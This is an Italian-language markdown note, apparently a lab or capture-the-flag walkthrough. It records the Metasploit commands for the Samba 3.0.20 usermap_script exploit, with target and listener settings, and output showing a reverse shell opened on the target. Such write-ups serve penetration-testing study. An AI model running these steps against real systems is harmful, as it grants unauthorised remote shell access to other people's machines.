## ✅ Exploit: Samba 3.0.20 - usermap_script

### 🔎 Comando iniziale in Metasploit
```bash
msfconsole
search Samba 3.0.20

##🚀 Configurazione exploit

use exploit/multi/samba/usermap_script
set RHOSTS 10.129.151.196
set LHOST <tuo_IP_tun0>
run

##📤 Output finale

[*] Started reverse TCP handler on 10.10.14.81:4444 
[*] Command shell session 1 opened (10.10.14.81:4444 -> 10.129.151.196:48261) at 2025-05-23 09:45:47 -0500

✅ Risultato: Shell remota ottenuta con successo sfruttando una vulnerabilità nota in Samba 3.0.20.


